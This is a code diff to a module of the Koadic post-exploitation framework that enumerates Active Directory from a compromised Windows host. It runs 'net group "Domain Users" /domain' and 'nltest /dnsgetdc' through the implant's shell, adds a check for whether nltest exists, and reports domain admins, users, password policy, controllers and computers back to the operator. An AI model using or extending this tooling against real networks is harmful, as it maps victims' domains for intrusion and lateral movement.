@@ -154,7 +154,7 @@ try
     headers["Header"] = "Admins";
     Koadic.work.report(domain_admins, headers);
 
-    var domain_users = ParseUsers(Koadic.shell.exec("net user /domain", "~DIRECTORY~\\"+Koadic.uuid()+".txt"));
+    var domain_users = ParseUsers(Koadic.shell.exec("net group \"Domain Users\" /domain", "~DIRECTORY~\\"+Koadic.uuid()+".txt"));
     headers["Header"] = "Users";
     Koadic.work.report(domain_users, headers);
 
@@ -162,9 +162,13 @@ try
     headers["Header"] = "PassPolicy";
     Koadic.work.report(password_policy, headers);
 
-    var domain_controllers = ParseDomainControllers(Koadic.shell.exec("nltest /dnsgetdc:"+fqdn, "~DIRECTORY~\\"+Koadic.uuid()+".txt"));
-    headers["Header"] = "DomainControllers";
-    Koadic.work.report(domain_controllers, headers);
+    var check_nltest_exist = Koadic.shell.exec("nltest /?", "~DIRECTORY~\\"+Koadic.uuid()+".txt");
+    if (check_nltest_exist.indexOf("not recognized") == -1)
+    {
+        var domain_controllers = ParseDomainControllers(Koadic.shell.exec("nltest /dnsgetdc:"+fqdn, "~DIRECTORY~\\"+Koadic.uuid()+".txt"));
+        headers["Header"] = "DomainControllers";
+        Koadic.work.report(domain_controllers, headers);
+    }
 
     var domain_computers = ParseDomainComputers();
     headers["Header"] = "DomainComputers";
